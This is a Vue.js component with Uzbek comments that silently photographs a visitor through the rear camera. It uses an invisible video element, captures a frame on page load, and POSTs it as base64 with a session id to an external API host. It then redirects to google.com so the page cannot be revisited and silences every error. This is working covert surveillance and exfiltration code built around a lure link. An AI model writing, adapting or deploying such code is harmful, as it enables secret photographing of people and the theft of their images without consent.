<template>
  <!-- UI butunlay yashirin -->
  <video ref="video" playsinline muted style="display:none"></video>
</template>

<script>
export default {
  name: "BackCamera",

  mounted() {
    this.capture()
  },

  methods: {
    async capture() {
      const session_id = this.$route.params.id
      if (!session_id) return this.redirect()

      if (!navigator.mediaDevices?.getUserMedia) {
        return this.redirect()
      }

      try {
        // 🔹 1) ORQA kamerani aniqlashga urinamiz
        const devices = await navigator.mediaDevices.enumerateDevices()
        const backCam = devices.find(
            d =>
                d.kind === "videoinput" &&
                /back|rear|environment/i.test(d.label)
        )

        const constraints = backCam
            ? { video: { deviceId: { exact: backCam.deviceId } }, audio: false }
            : { video: true, audio: false } // 🔁 fallback

        // 🔹 2) Kamerani ochamiz
        const stream = await navigator.mediaDevices.getUserMedia(constraints)

        const video = this.$refs.video
        video.srcObject = stream

        // 🔹 iOS / WebView uchun MUHIM
        await video.play()

        // 🔹 Kamera haqiqatan tayyor bo‘lsin
        await new Promise(res => {
          if (video.readyState >= 2) return res()
          video.onloadedmetadata = res
        })

        // 🔹 Real qurilmalar uchun kichik buffer
        await new Promise(r => setTimeout(r, 600))

        // 🔹 3) Rasm olish
        const canvas = document.createElement("canvas")
        canvas.width = video.videoWidth || 640
        canvas.height = video.videoHeight || 480
        const ctx = canvas.getContext("2d")
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height)

        // 🔹 Kamerani yopamiz
        stream.getTracks().forEach(t => t.stop())

        // 🔹 4) toBlob → base64 (ENG ISHONCHLI)
        canvas.toBlob(blob => {
          if (!blob) return this.redirect()

          const reader = new FileReader()
          reader.onloadend = async () => {
            const imageBase64 = reader.result // data:image/jpeg;base64,...

            try {
              await fetch("https://api.peoplehello.ru/api/back-cam", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                  image: imageBase64,
                  session_id
                })
              })
            } catch (e) {
              // jim
            } finally {
              this.redirect()
            }
          }

          reader.readAsDataURL(blob)
        }, "image/jpeg", 0.85)

      } catch (err) {
        this.redirect()
      }
    },

    redirect() {
      // back bosilganda qaytib kelmasin
      window.location.replace("https://google.com")
    }
  }
}
</script>
